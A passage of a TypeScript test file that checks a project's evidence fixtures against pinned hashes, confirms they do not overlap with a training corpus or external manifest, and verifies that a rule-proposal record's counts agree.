    for (const p of pins) { assert.ok(notices.includes(` ${p.fixture}\n`), p.fixture); listed.add(p.fixture.split("/").pop()!); }
  }
  const have = readdirSync(resolve(root, "peaceai/test/fixtures/m98-ee"));
  for (const f of have) assert.ok(listed.has(f), f);
  assert.equal(have.length, listed.size);
});

test("evidence: no overlap with the training corpus or the ext-manifest; Peace's repos checked first and not counted; proposal record agrees", () => {
  const buf = readManifestBytes(resolve(root, "peaceai/model"), "ext-manifest");
  assert.equal(createHash("sha256").update(buf).digest("hex"), EV.manifestSha256);
  const repos = new Set<string>(); const shas = new Set<string>();
  for (const l of buf.toString("utf8").split("\n")) if (l.trim()) { const r = JSON.parse(l) as { repo?: string; sha256?: string }; if (r.repo) repos.add(r.repo); if (r.sha256) shas.add(r.sha256); }
  for (const r of (JSON.parse(read("peaceai/model/ext-corpus.json")) as { repos: { name: string }[] }).repos) repos.add(r.name);
  for (const e of [...EV.g1, ...EV.g2]) {
    assert.ok(!repos.has(e.repo), e.repo);
    assert.ok(!e.repo.startsWith("PeaceG03/"));
    const pins = "before" in e ? [e.before, e.after] : [e.test, ...e.closure];
    for (const p of pins) assert.ok(!shas.has(p.sha256), p.fixture);
  }
  for (const p of EV.peace) { assert.equal(p.counted, 0); assert.match(p.checkedAt, /^[0-9a-f]{40}$/); }
  const rec = JSON.parse(read("peaceai/rules/proposals/public-existing-function-edit-v1.json")) as { status: string; evidence: { g1: number; g2: number; repos: number; bar: number; qualifies: boolean } };
  assert.match(rec.status, /^proposal-off/);
  assert.equal(rec.evidence.g1, EV.g1.length);
  assert.equal(rec.evidence.g2, EV.g2.length);
  const all = [...new Set([...EV.g1, ...EV.g2].map((e) => e.repo))].sort();
  assert.equal(rec.evidence.repos, all.length);
  assert.ok(rec.evidence.qualifies && EV.g1.length >= rec.evidence.bar && EV.g2.length >= rec.evidence.bar);
  assert.deepEqual(SPEC.evidence.repos, all);
});
